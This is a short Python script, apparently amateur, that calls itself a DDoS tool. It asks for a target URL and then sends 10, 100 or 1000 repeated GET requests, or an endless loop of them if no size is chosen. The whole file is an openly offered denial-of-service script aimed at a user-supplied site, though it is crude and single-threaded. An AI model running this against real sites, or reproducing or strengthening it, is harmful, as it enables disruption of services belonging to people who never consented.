import requests
def ddoser():
    x = input("Give URL to DDoS: ")
    if x == "":
        print("error")
    y = input("Do you want small/medium/big DDoS? ")
    if y == "small":
        i = 0
        while i < 10:
            a = requests.get(x)
            print("DDoS SENT!!!!!")
            i+=1
    elif y == "medium":
        i = 0
        while i < 100:
            a = requests.get(x)
            print("DDoS SENT!!!!!")
            i+=1
    elif y == "big":
        i = 0
        while i < 1000:
            a = requests.get(x)
            print("DDoS SENT!!!!!")
            i+=1
    else:
        print("u didnt give a size for ddos so i will just send infinite ddos")
        while True:
            a = requests.get(x)
            print(a.status_code)
        